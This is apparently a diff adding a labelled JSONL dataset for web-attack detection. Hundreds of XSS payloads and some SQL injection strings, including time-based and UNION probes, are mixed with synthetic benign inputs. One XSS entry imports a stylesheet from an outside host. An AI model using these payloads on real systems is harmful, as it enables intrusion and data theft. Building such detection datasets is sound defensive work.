+{"input":"<noframes id=x tabindex=1 ondeactivate=alert(1)><\/noframes><input id=y autofocus>","label":"XSS"}
+{"input":"<style>@keyframes slidein {}<\/style><option style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/option>","label":"XSS"}
+{"input":"<caption onkeypress=\"alert(1)\" contenteditable>test<\/caption>","label":"XSS"}
+{"input":"<progress onkeyup=\"alert(1)\" contenteditable>test<\/progress>","label":"XSS"}
+{"input":"<section onkeyup=\"alert(1)\" contenteditable>test<\/section>","label":"XSS"}
+{"input":"what is music?","label":"benign"}
+{"input":"<style>:target {color: red;}<\/style><b id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/b>","label":"XSS"}
+{"input":"Contact: mcgeewesley@example.org","label":"benign"}
+{"input":"<script ondblclick=\"alert(1)\">test<\/script>","label":"XSS"}
+{"input":"travel examples in 2025","label":"benign"}
+{"input":"<select onkeydown=\"alert(1)\" contenteditable>test<\/select>","label":"XSS"}
+{"input":"{\"user\": \"umiller\", \"action\": \"delete\", \"timestamp\": \"1981-12-12T01:26:39\"}","label":"benign"}
+{"input":"<address draggable=\"true\" ondragleave=\"alert(1)\">test<\/address>","label":"XSS"}
+{"input":"<svg><acronym onload=alert(1)><\/acronym>","label":"XSS"}
+{"input":"GET \/category\/main\/app HTTP\/1.1","label":"benign"}
+{"input":"Interesting tutorial!","label":"benign"}
+{"input":"'-eval(\"window['pro'%2B'mpt'](8)\")-'","label":"XSS"}
+{"input":"<style onmousemove=\"alert(1)\">test<\/style>","label":"XSS"}
+{"input":"<footer onkeypress=\"alert(1)\" contenteditable>test<\/footer>","label":"XSS"}
+{"input":"<param onmouseover=\"alert(1)\">test<\/param>","label":"XSS"}
+{"input":"<select draggable=\"true\" ondragstart=\"alert(1)\">test<\/select>","label":"XSS"}
+{"input":"<tt id=x tabindex=1 onactivate=alert(1)><\/tt>","label":"XSS"}
+{"input":"<basefont onclick=\"alert(1)\">test<\/basefont>","label":"XSS"}
+{"input":"GET \/main HTTP\/1.1","label":"benign"}
+{"input":"<style>@keyframes slidein {}<\/style><slot style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/slot>","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><rt id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/rt>","label":"XSS"}
+{"input":"<output oncopy=\"alert(1)\" contenteditable>test<\/output>","label":"XSS"}
+{"input":"<ins draggable=\"true\" ondragenter=\"alert(1)\">test<\/ins>","label":"XSS"}
+{"input":"<kbd onmouseenter=\"alert(1)\">test<\/kbd>","label":"XSS"}
+{"input":"<image id=x tabindex=1 onfocusin=alert(1)><\/image>","label":"XSS"}
+{"input":"<frame oncut=\"alert(1)\" contenteditable>test<\/frame>","label":"XSS"}
+{"input":"Hello, my name is Brandon Diaz.","label":"benign"}
+{"input":"GET \/tags\/blog\/posts HTTP\/1.1","label":"benign"}
+{"input":"<del onkeypress=\"alert(1)\" contenteditable>test<\/del>","label":"XSS"}
+{"input":"\/*start*\/' UNION SELECT sum(columnname ) from tablename --\/*end*\/","label":"SQLi"}
+{"input":"<div id=\"128\"><svg><style>&lt;img\/src=x onerror=alert(128)\/\/ <\/b>\/\/[\"'`-->]]>]<\/div>","label":"XSS"}
+{"input":"travel examples in 2025","label":"benign"}
+{"input":"Contact: ashleyhoffman@example.com","label":"benign"}
+{"input":"<video src\/onerror=alert(1)>","label":"XSS"}
+{"input":"<mark id=x tabindex=1 onbeforeactivate=alert(1)><\/mark>","label":"XSS"}
+{"input":"username=calderontanya&password=#072X3CidM","label":"benign"}
+{"input":"search=top 10 python blogs","label":"benign"}
+{"input":"<script onkeyup=\"alert(1)\" contenteditable>test<\/script>","label":"XSS"}
+{"input":"<keygen oncut=\"alert(1)\" contenteditable>test<\/keygen>","label":"XSS"}
+{"input":"GET \/search\/wp-content\/category HTTP\/1.1","label":"benign"}
+{"input":"<form id=x tabindex=1 ondeactivate=alert(1)><\/form><input id=y autofocus>","label":"XSS"}
+{"input":"feedback=Wind maybe general continue parent.","label":"benign"}
+{"input":"Contact: tiffanybryan@example.com","label":"benign"}
+{"input":"<ol oncontextmenu=\"alert(1)\">test<\/ol>","label":"XSS"}
+{"input":"Contact: nelsonchad@example.org","label":"benign"}
+{"input":"<sup onbeforecopy=\"alert(1)\" contenteditable>test<\/sup>","label":"XSS"}
+{"input":"Contact: turnerrobert@example.org","label":"benign"}
+{"input":"top 10 finance blogs","label":"benign"}
+{"input":"<form onmouseleave=\"alert(1)\">test<\/form>","label":"XSS"}
+{"input":"<tfoot onkeyup=\"alert(1)\" contenteditable>test<\/tfoot>","label":"XSS"}
+{"input":"Great read!","label":"benign"}
+{"input":"<font onbeforecopy=\"alert(1)\" contenteditable>test<\/font>","label":"XSS"}
+{"input":"<s oncopy=\"alert(1)\" contenteditable>test<\/s>","label":"XSS"}
+{"input":"<input onclick=\"alert(1)\">test<\/input>","label":"XSS"}
+{"input":"<input draggable=\"true\" ondragstart=\"alert(1)\">test<\/input>","label":"XSS"}
+{"input":"<time oncopy=\"alert(1)\" contenteditable>test<\/time>","label":"XSS"}
+{"input":"<STYLE>@import'http:\/\/ha.ckers.org\/xss.css';<\/STYLE>","label":"XSS"}
+{"input":"Hello, my name is Rita Kelly.","label":"benign"}
+{"input":"<form><textarea oninvalid=alert(1) required><input type=submit>","label":"XSS"}
+{"input":"<big draggable=\"true\" ondragenter=\"alert(1)\">test<\/big>","label":"XSS"}
+{"input":"{\"user\": \"acobb\", \"action\": \"delete\", \"timestamp\": \"1988-07-12T18:13:24\"}","label":"benign"}
+{"input":"{\"user\": \"ronald26\", \"action\": \"view\", \"timestamp\": \"2024-08-16T11:09:27\"}","label":"benign"}
+{"input":"name=hunterbrenda&email=richard34@example.com","label":"benign"}
+{"input":"<strong id=x tabindex=1 onfocus=alert(1)><\/strong>","label":"XSS"}
+{"input":"how to music tutorial","label":"benign"}
+{"input":"<style>@keyframes slidein {}<\/style><element style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/element>","label":"XSS"}
+{"input":"<TABLE BACKGROUND=\"javascript:alert('XSS')\">","label":"XSS"}
+{"input":"{\"user\": \"epayne\", \"action\": \"edit\", \"timestamp\": \"2007-07-05T21:07:40\"}","label":"benign"}
+{"input":"<style>@keyframes slidein {}<\/style><header style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/header>","label":"XSS"}
+{"input":"<sub oncut=\"alert(1)\" contenteditable>test<\/sub>","label":"XSS"}
+{"input":"username=iwatson&password=&N(Zc&XQq6","label":"benign"}
+{"input":"<rt draggable=\"true\" ondragleave=\"alert(1)\">test<\/rt>","label":"XSS"}
+{"input":"<menu id=x tabindex=1 onbeforeactivate=alert(1)><\/menu>","label":"XSS"}
+{"input":"Hello, my name is Kelly Morgan.","label":"benign"}
+{"input":"GET \/app\/wp-content HTTP\/1.1","label":"benign"}
+{"input":"Contact: ubates@example.net","label":"benign"}
+{"input":"<h1 onblur=alert(1) tabindex=1 id=x><\/h1><input autofocus>","label":"XSS"}
+{"input":"1-true","label":"SQLi"}
+{"input":"Hello, my name is William Jones.","label":"benign"}
+{"input":"<style>:target {color:red;}<\/style><dir id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/dir>","label":"XSS"}
+{"input":"<hr id=x tabindex=1 onfocus=alert(1)><\/hr>","label":"XSS"}
+{"input":"Nice guide!","label":"benign"}
+{"input":"<h1 draggable=\"true\" ondrag=\"alert(1)\">test<\/h1>","label":"XSS"}
+{"input":"{\"user\": \"josephberry\", \"action\": \"delete\", \"timestamp\": \"2016-04-29T07:50:18\"}","label":"benign"}
+{"input":"<div style=xss:expressio\\6e(alert(1))>","label":"XSS"}
+{"input":"Or 1=1","label":"SQLi"}
+{"input":"<slot onmouseover=\"alert(1)\">test<\/slot>","label":"XSS"}
+{"input":"GET \/app\/tag HTTP\/1.1","label":"benign"}
+{"input":"<style>@keyframes x{}<\/style><rtc style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/rtc>","label":"XSS"}
+{"input":"Hello, my name is Eddie Burton.","label":"benign"}
+{"input":"<font draggable=\"true\" ondrag=\"alert(1)\">test<\/font>","label":"XSS"}
+{"input":"Hello, my name is Patricia Collins.","label":"benign"}
+{"input":"Hello, my name is Calvin Lozano.","label":"benign"}
+{"input":"<img onkeyup=\"alert(1)\" contenteditable>test<\/img>","label":"XSS"}
+{"input":"\"-eval(\"window['pro'%2B'mpt'](8)\")-\"","label":"XSS"}
+{"input":"Hello, my name is Amanda Smith.","label":"benign"}
+{"input":"{\"user\": \"katherine48\", \"action\": \"delete\", \"timestamp\": \"1978-04-21T17:11:14\"}","label":"benign"}
+{"input":"<wbr onmousemove=\"alert(1)\">test<\/wbr>","label":"XSS"}
+{"input":"<dd onmouseenter=\"alert(1)\">test<\/dd>","label":"XSS"}
+{"input":"<basefont draggable=\"true\" ondragstart=\"alert(1)\">test<\/basefont>","label":"XSS"}
+{"input":"Contact: sullivanmichael@example.com","label":"benign"}
+{"input":"Finding%20the%20table%20name","label":"SQLi"}
+{"input":"<x%2Fonxxx=1","label":"XSS"}
+{"input":"best music books","label":"benign"}
+{"input":"<style>@keyframes slidein {}<\/style><legend style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/legend>","label":"XSS"}
+{"input":"<dd onkeydown=\"alert(1)\" contenteditable>test<\/dd>","label":"XSS"}
+{"input":"<caption onbeforecopy=\"alert(1)\" contenteditable>test<\/caption>","label":"XSS"}
+{"input":"'';!--\"<XSS>=&{()}","label":"XSS"}
+{"input":"<spacer onblur=alert(1) tabindex=1 id=x><\/spacer><input autofocus>","label":"XSS"}
+{"input":"<h1 onmouseleave=\"alert(1)\">test<\/h1>","label":"XSS"}
+{"input":"<frame draggable=\"true\" ondragend=\"alert(1)\">test<\/frame>","label":"XSS"}
+{"input":"<label onkeypress=\"alert(1)\" contenteditable>test<\/label>","label":"XSS"}
+{"input":"<command onbeforecut=\"alert(1)\" contenteditable>test<\/command>","label":"XSS"}
+{"input":"<isindex onclick=\"alert(1)\">test<\/isindex>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><a style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/a>","label":"XSS"}
+{"input":"GET \/category HTTP\/1.1","label":"benign"}
+{"input":"best python books","label":"benign"}
+{"input":"Contact: cellis@example.net","label":"benign"}
+{"input":"<option draggable=\"true\" ondragstart=\"alert(1)\">test<\/option>","label":"XSS"}
+{"input":"<style>@keyframes slidein {}<\/style><samp style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/samp>","label":"XSS"}
+{"input":"{\"user\": \"lauren30\", \"action\": \"download\", \"timestamp\": \"1989-06-05T07:02:23\"}","label":"benign"}
+{"input":"<style>:target {color: red;}<\/style><td id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/td>","label":"XSS"}
+{"input":"GET \/list\/posts HTTP\/1.1","label":"benign"}
+{"input":"GET \/list\/main\/blog HTTP\/1.1","label":"benign"}
+{"input":"--%0a or%09 #\/*random*\/","label":"SQLi"}
+{"input":"feedback=Reason product response while between.","label":"benign"}
+{"input":"Nice post!","label":"benign"}
+{"input":"GET \/category HTTP\/1.1","label":"benign"}
+{"input":"search=what is finance?","label":"benign"}
+{"input":"<form onsubmit=alert(1)><input type=submit>","label":"XSS"}
+{"input":"<input oncut=alert(1) value=\"XSS\" autofocus>","label":"XSS"}
+{"input":"<style>:target {color: red;}<\/style><del id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/del>","label":"XSS"}
+{"input":"<u draggable=\"true\" ondragend=\"alert(1)\">test<\/u>","label":"XSS"}
+{"input":"<div onbeforecut=\"alert(1)\" contenteditable>test<\/div>","label":"XSS"}
+{"input":"what is python?","label":"benign"}
+{"input":"best machine learning books","label":"benign"}
+{"input":"<svg><![CDATA[><image xlink:href=\"]]><img src=xx:x onerror=alert(2)\/\/\"><\/svg>\/\/[\"'`-->]]>]<\/div>","label":"XSS"}
+{"input":"how to machine learning tutorial","label":"benign"}
+{"input":"Contact: cainanthony@example.com","label":"benign"}
+{"input":"<img draggable=\"true\" ondragend=\"alert(1)\">test<\/img>","label":"XSS"}
+{"input":"<optgroup onbeforecut=\"alert(1)\" contenteditable>test<\/optgroup>","label":"XSS"}
+{"input":"name=davistimothy&email=bushroger@example.org","label":"benign"}
+{"input":"<output onmouseup=\"alert(1)\">test<\/output>","label":"XSS"}
+{"input":"<map id=x tabindex=1 onactivate=alert(1)><\/map>","label":"XSS"}
+{"input":"<em onmouseout=\"alert(1)\">test<\/em>","label":"XSS"}
+{"input":"<multicol onmouseleave=\"alert(1)\">test<\/multicol>","label":"XSS"}
+{"input":"<spacer onmouseover=\"alert(1)\">test<\/spacer>","label":"XSS"}
+{"input":"<script draggable=\"true\" ondragend=\"alert(1)\">test<\/script>","label":"XSS"}
+{"input":"<menu onmouseleave=\"alert(1)\">test<\/menu>","label":"XSS"}
+{"input":"\/*start*\/# Numeric\/*end*\/","label":"SQLi"}
+{"input":"<meter onkeyup=\"alert(1)\" contenteditable>test<\/meter>","label":"XSS"}
+{"input":"<tbody onmousemove=\"alert(1)\">test<\/tbody>","label":"XSS"}
+{"input":"Contact: jonesanna@example.com","label":"benign"}
+{"input":"<source onkeyup=\"alert(1)\" contenteditable>test<\/source>","label":"XSS"}
+{"input":"<isindex draggable=\"true\" ondragend=\"alert(1)\">test<\/isindex>","label":"XSS"}
+{"input":"<spacer draggable=\"true\" ondragenter=\"alert(1)\">test<\/spacer>","label":"XSS"}
+{"input":"Contact: jonjones@example.net","label":"benign"}
+{"input":"GET \/list HTTP\/1.1","label":"benign"}
+{"input":"<tt id=x tabindex=1 ondeactivate=alert(1)><\/tt><input id=y autofocus>","label":"XSS"}
+{"input":"Interesting tutorial!","label":"benign"}
+{"input":"<rtc onmouseenter=\"alert(1)\">test<\/rtc>","label":"XSS"}
+{"input":"<listing id=x tabindex=1 onfocusin=alert(1)><\/listing>","label":"XSS"}
+{"input":"<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>","label":"XSS"}
+{"input":"<listing onmouseout=\"alert(1)\">test<\/listing>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><col style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/col>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><em style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/em>","label":"XSS"}
+{"input":"best finance books","label":"benign"}
+{"input":"<listing onblur=alert(1) tabindex=1 id=x><\/listing><input autofocus>","label":"XSS"}
+{"input":"<address draggable=\"true\" ondragend=\"alert(1)\">test<\/address>","label":"XSS"}
+{"input":"Contact: mariaburnett@example.net","label":"benign"}
+{"input":"<sup draggable=\"true\" ondragleave=\"alert(1)\">test<\/sup>","label":"XSS"}
+{"input":"<svg id=x tabindex=1 onbeforeactivate=alert(1)><\/svg>","label":"XSS"}
+{"input":"';WAITFOR DELAY '0:0:30'--","label":"SQLi"}
+{"input":"<blockquote oncopy=\"alert(1)\" contenteditable>test<\/blockquote>","label":"XSS"}
+{"input":"<sup onmouseleave=\"alert(1)\">test<\/sup>","label":"XSS"}
+{"input":"<param onkeydown=\"alert(1)\" contenteditable>test<\/param>","label":"XSS"}
+{"input":"<select onmouseover=\"alert(1)\">test<\/select>","label":"XSS"}
+{"input":"Insightful read!","label":"benign"}
+{"input":"<noframes draggable=\"true\" ondragenter=\"alert(1)\">test<\/noframes>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><multicol ondrop=alert(1) contenteditable>drop here<\/multicol>","label":"XSS"}
+{"input":"<acronym id=x tabindex=1 onbeforeactivate=alert(1)><\/acronym>","label":"XSS"}
+{"input":"<th onbeforecut=\"alert(1)\" contenteditable>test<\/th>","label":"XSS"}
+{"input":"cooking examples in 2025","label":"benign"}
+{"input":"{\"user\": \"martinezmelissa\", \"action\": \"delete\", \"timestamp\": \"1996-03-29T13:40:12\"}","label":"benign"}
+{"input":"<br onmouseover=\"alert(1)\">test<\/br>","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><a id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/a>","label":"XSS"}
+{"input":"<ol onmousedown=\"alert(1)\">test<\/ol>","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><dialog id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/dialog>","label":"XSS"}
+{"input":"<dialog onbeforecopy=\"alert(1)\" contenteditable>test<\/dialog>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><noscript style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/noscript>","label":"XSS"}
+{"input":"Hello, my name is Heather Wu.","label":"benign"}
+{"input":"<nav ondblclick=\"alert(1)\">test<\/nav>","label":"XSS"}
+{"input":"GET \/search\/explore HTTP\/1.1","label":"benign"}
+{"input":"<datalist draggable=\"true\" ondragstart=\"alert(1)\">test<\/datalist>","label":"XSS"}
+{"input":"<summary id=x tabindex=1 ondeactivate=alert(1)><\/summary><input id=y autofocus>","label":"XSS"}
+{"input":"<shadow onfocusout=alert(1) tabindex=1 id=x><\/shadow><input autofocus>","label":"XSS"}
+{"input":"<ruby oncut=\"alert(1)\" contenteditable>test<\/ruby>","label":"XSS"}
+{"input":"Contact: jackmiller@example.net","label":"benign"}
+{"input":"<basefont draggable=\"true\" ondragenter=\"alert(1)\">test<\/basefont>","label":"XSS"}
+{"input":"Contact: nsmith@example.com","label":"benign"}
+{"input":"what is music?","label":"benign"}
+{"input":"<style>@keyframes x{}<\/style><spacer style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/spacer>","label":"XSS"}
+{"input":"finance examples in 2025","label":"benign"}
+{"input":"<frame onmousedown=\"alert(1)\">test<\/frame>","label":"XSS"}
+{"input":"top 10 music blogs","label":"benign"}
+{"input":"{\"user\": \"bauermichael\", \"action\": \"download\", \"timestamp\": \"1997-03-21T02:11:07\"}","label":"benign"}
+{"input":"<br><br><br><br><br><br><x id=x>#x","label":"XSS"}
+{"input":"<area oncontextmenu=\"alert(1)\">test<\/area>","label":"XSS"}
+{"input":"<noframes onkeydown=\"alert(1)\" contenteditable>test<\/noframes>","label":"XSS"}
+{"input":"finance examples in 2025","label":"benign"}
+{"input":"Contact: tmcgee@example.org","label":"benign"}
+{"input":"<style>@keyframes slidein {}<\/style><template style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/template>","label":"XSS"}
+{"input":"<header id=x tabindex=1 onfocus=alert(1)><\/header>","label":"XSS"}
+{"input":"<style>:target {color:red;}<\/style><br id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/br>","label":"XSS"}
+{"input":"<u ondblclick=\"alert(1)\">test<\/u>","label":"XSS"}
+{"input":"<nav oncut=\"alert(1)\" contenteditable>test<\/nav>","label":"XSS"}
+{"input":"<html draggable=\"true\" ondragend=\"alert(1)\">test<\/html>","label":"XSS"}
+{"input":"<article draggable=\"true\" ondragenter=\"alert(1)\">test<\/article>","label":"XSS"}
+{"input":"<style>@keyframes slidein {}<\/style><var style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"><\/var>","label":"XSS"}
+{"input":"what is travel?","label":"benign"}
+{"input":"<content onkeydown=\"alert(1)\" contenteditable>test<\/content>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><blink ondragover=alert(1) contenteditable>drop here<\/blink>","label":"XSS"}
+{"input":"<source onblur=alert(1) tabindex=1 id=x><\/source><input autofocus>","label":"XSS"}
+{"input":"{\"user\": \"ukelly\", \"action\": \"download\", \"timestamp\": \"2023-08-09T12:04:15\"}","label":"benign"}
+{"input":"<dialog id=x tabindex=1 onfocus=alert(1)><\/dialog>","label":"XSS"}
+{"input":"<title onkeypress=\"alert(1)\" contenteditable>test<\/title>","label":"XSS"}
+{"input":"<table onbeforepaste=\"alert(1)\" contenteditable>test<\/table>","label":"XSS"}
+{"input":"<%<!--'%><script>alert(1);<\/script -->","label":"XSS"}
+{"input":"GET \/posts\/main HTTP\/1.1","label":"benign"}
+{"input":"<isindex onbeforepaste=\"alert(1)\" contenteditable>test<\/isindex>","label":"XSS"}
+{"input":"page=10&sort=asc","label":"benign"}
+{"input":"page=5&sort=asc","label":"benign"}
+{"input":"GET \/tags\/wp-content\/categories HTTP\/1.1","label":"benign"}
+{"input":"<li id=x tabindex=1 onbeforeactivate=alert(1)><\/li>","label":"XSS"}
+{"input":"GET \/category\/main HTTP\/1.1","label":"benign"}
+{"input":"1' RO '","label":"SQLi"}
+{"input":"<iframe onbeforepaste=\"alert(1)\" contenteditable>test<\/iframe>","label":"XSS"}
+{"input":"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}<\/style><big id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"><\/big>","label":"XSS"}
+{"input":"Helpful post!","label":"benign"}
+{"input":"<tt onkeypress=\"alert(1)\" contenteditable>test<\/tt>","label":"XSS"}
+{"input":"<noscript onclick=\"alert(1)\">test<\/noscript>","label":"XSS"}
+{"input":"<nobr onkeydown=\"alert(1)\" contenteditable>test<\/nobr>","label":"XSS"}
+{"input":"username=samantha87&password=h#c(0ClYdz","label":"benign"}
+{"input":"<link rel=stylesheet href=1 onerror=alert(1)>","label":"XSS"}
+{"input":"<basefont onpaste=\"alert(1)\" contenteditable>test<\/basefont>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><dir style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/dir>","label":"XSS"}
+{"input":"<menu draggable=\"true\" ondragleave=\"alert(1)\">test<\/menu>","label":"XSS"}
+{"input":"<rp onmousemove=\"alert(1)\">test<\/rp>","label":"XSS"}
+{"input":"<marquee oncopy=\"alert(1)\" contenteditable>test<\/marquee>","label":"XSS"}
+{"input":"what is cooking?","label":"benign"}
+{"input":"<iframe ondblclick=\"alert(1)\">test<\/iframe>","label":"XSS"}
+{"input":"<noscript id=x tabindex=1 onfocus=alert(1)><\/noscript>","label":"XSS"}
+{"input":"<noembed draggable=\"true\" ondragenter=\"alert(1)\">test<\/noembed>","label":"XSS"}
+{"input":"<section onmouseleave=\"alert(1)\">test<\/section>","label":"XSS"}
+{"input":"best music books","label":"benign"}
+{"input":"<strong draggable=\"true\" ondragend=\"alert(1)\">test<\/strong>","label":"XSS"}
+{"input":"<head id=x tabindex=1 ondeactivate=alert(1)><\/head><input id=y autofocus>","label":"XSS"}
+{"input":"<applet onkeydown=\"alert(1)\" contenteditable>test<\/applet>","label":"XSS"}
+{"input":"{\"user\": \"mariaward\", \"action\": \"delete\", \"timestamp\": \"2010-05-27T08:41:50\"}","label":"benign"}
+{"input":"<address onblur=alert(1) tabindex=1 id=x><\/address><input autofocus>","label":"XSS"}
+{"input":"Helpful article!","label":"benign"}
+{"input":"{\"user\": \"alison77\", \"action\": \"download\", \"timestamp\": \"1994-01-13T14:30:35\"}","label":"benign"}
+{"input":"<figcaption onfocusout=alert(1) tabindex=1 id=x><\/figcaption><input autofocus>","label":"XSS"}
+{"input":"Hello, my name is Patrick Murray.","label":"benign"}
+{"input":"<style onfocusout=alert(1) tabindex=1 id=x><\/style><input autofocus>","label":"XSS"}
+{"input":"AND%20true","label":"SQLi"}
+{"input":"Hello, my name is Carl Campbell.","label":"benign"}
+{"input":"page=12&sort=desc","label":"benign"}
+{"input":"<wbr onbeforecut=\"alert(1)\" contenteditable>test<\/wbr>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><shadow ondrop=alert(1) contenteditable>drop here<\/shadow>","label":"XSS"}
+{"input":"<style>:target {color: red;}<\/style><data id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)><\/data>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><area ondragover=alert(1) contenteditable>drop here<\/area>","label":"XSS"}
+{"input":"<command draggable=\"true\" ondragend=\"alert(1)\">test<\/command>","label":"XSS"}
+{"input":"Contact: ulewis@example.org","label":"benign"}
+{"input":"<xmp draggable=\"true\" ondragend=\"alert(1)\">test<\/xmp>","label":"XSS"}
+{"input":"what is python?","label":"benign"}
+{"input":"Contact: lowedaniel@example.com","label":"benign"}
+{"input":"Hello, my name is Katie Johnson.","label":"benign"}
+{"input":"best travel books","label":"benign"}
+{"input":"<i onclick=\"alert(1)\">test<\/i>","label":"XSS"}
+{"input":"<center onblur=alert(1) tabindex=1 id=x><\/center><input autofocus>","label":"XSS"}
+{"input":"GET \/tag\/categories\/category HTTP\/1.1","label":"benign"}
+{"input":"Contact: suarezkelly@example.org","label":"benign"}
+{"input":"<s onbeforepaste=\"alert(1)\" contenteditable>test<\/s>","label":"XSS"}
+{"input":"<image onbeforepaste=\"alert(1)\" contenteditable>test<\/image>","label":"XSS"}
+{"input":"<svg><i onload=alert(1)><\/i>","label":"XSS"}
+{"input":"<rp draggable=\"true\" ondrag=\"alert(1)\">test<\/rp>","label":"XSS"}
+{"input":"<dt onmouseenter=\"alert(1)\">test<\/dt>","label":"XSS"}
+{"input":"<nextid oncopy=\"alert(1)\" contenteditable>test<\/nextid>","label":"XSS"}
+{"input":"{\"user\": \"longchristopher\", \"action\": \"download\", \"timestamp\": \"1999-11-23T01:25:31\"}","label":"benign"}
+{"input":"Contact: valerie95@example.com","label":"benign"}
+{"input":"Hello, my name is Melissa Park.","label":"benign"}
+{"input":"<style>:target {transform: rotate(180deg);}<\/style><isindex id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/isindex>","label":"XSS"}
+{"input":"GET \/tags\/categories\/wp-content HTTP\/1.1","label":"benign"}
+{"input":"Nice guide!","label":"benign"}
+{"input":"how to machine learning tutorial","label":"benign"}
+{"input":"Contact: freemanlindsey@example.com","label":"benign"}
+{"input":"<listing onbeforepaste=\"alert(1)\" contenteditable>test<\/listing>","label":"XSS"}
+{"input":"Contact: daniel15@example.net","label":"benign"}
+{"input":"GET \/blog HTTP\/1.1","label":"benign"}
+{"input":"Nice guide!","label":"benign"}
+{"input":"<rp onmouseleave=\"alert(1)\">test<\/rp>","label":"XSS"}
+{"input":"<input id=x tabindex=1 onactivate=alert(1)><\/input>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><input style=\"animation-name:x\" onanimationstart=\"alert(1)\"><\/input>","label":"XSS"}
+{"input":"<style>:target {transform: rotate(180deg);}<\/style><div id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/div>","label":"XSS"}
+{"input":"<var draggable=\"true\" ondragenter=\"alert(1)\">test<\/var>","label":"XSS"}
+{"input":"<dfn onkeypress=\"alert(1)\" contenteditable>test<\/dfn>","label":"XSS"}
+{"input":"%2C%28select%20%2A%20from%20%28select%28sleep%2810%29%29%29a%29","label":"SQLi"}
+{"input":"<nextid onkeypress=\"alert(1)\" contenteditable>test<\/nextid>","label":"XSS"}
+{"input":"<rt onmouseout=\"alert(1)\">test<\/rt>","label":"XSS"}
+{"input":"<audio draggable=\"true\" ondragleave=\"alert(1)\">test<\/audio>","label":"XSS"}
+{"input":"GET \/list\/search HTTP\/1.1","label":"benign"}
+{"input":"\/*start*\/' AND MID(VERSION(),1,1) = '5';\/*end*\/","label":"SQLi"}
+{"input":"<input onmousedown=\"alert(1)\">test<\/input>","label":"XSS"}
+{"input":"Hello, my name is Joshua Mullen.","label":"benign"}
+{"input":"<style>@keyframes x{}<\/style><cite style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/cite>","label":"XSS"}
+{"input":"<A href=javas%26#99;ript:alert(1)>click","label":"XSS"}
+{"input":"<figcaption onmouseleave=\"alert(1)\">test<\/figcaption>","label":"XSS"}
+{"input":"<dir onclick=\"alert(1)\">test<\/dir>","label":"XSS"}
+{"input":"<style>@keyframes x{}<\/style><optgroup style=\"animation-name:x\" onanimationend=\"alert(1)\"><\/optgroup>","label":"XSS"}
+{"input":"Hello, my name is Evelyn Randolph.","label":"benign"}
+{"input":"<style>:target {transform: rotate(180deg);}<\/style><iframe id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)><\/iframe>","label":"XSS"}
+{"input":"<rtc onmousedown=\"alert(1)\">test<\/rtc>","label":"XSS"}
+{"input":"\/*start*\/-1' UNION SELECT 1,2,3--+\/*end*\/","label":"SQLi"}
+{"input":"what is cooking?","label":"benign"}
+{"input":"<sub onclick=\"alert(1)\">test<\/sub>","label":"XSS"}
+{"input":"<dir draggable=\"true\" ondragend=\"alert(1)\">test<\/dir>","label":"XSS"}
+{"input":"<set attributeName=\"xlink:href\" begin=\"accessKey(c)\" to=\"\/\/example.com\/?c\" \/>","label":"XSS"}
+{"input":"<span id=x tabindex=1 onfocusin=alert(1)><\/span>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><param ondrop=alert(1) contenteditable>drop here<\/param>","label":"XSS"}
+{"input":"<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">","label":"XSS"}
+{"input":"<svg><sup onload=alert(1)><\/sup>","label":"XSS"}
+{"input":"<div draggable=\"true\" contenteditable>drag me<\/div><select ondrop=alert(1) contenteditable>drop here<\/select>","label":"XSS"}
+{"input":"<big onmouseup=\"alert(1)\">test<\/big>","label":"XSS"}
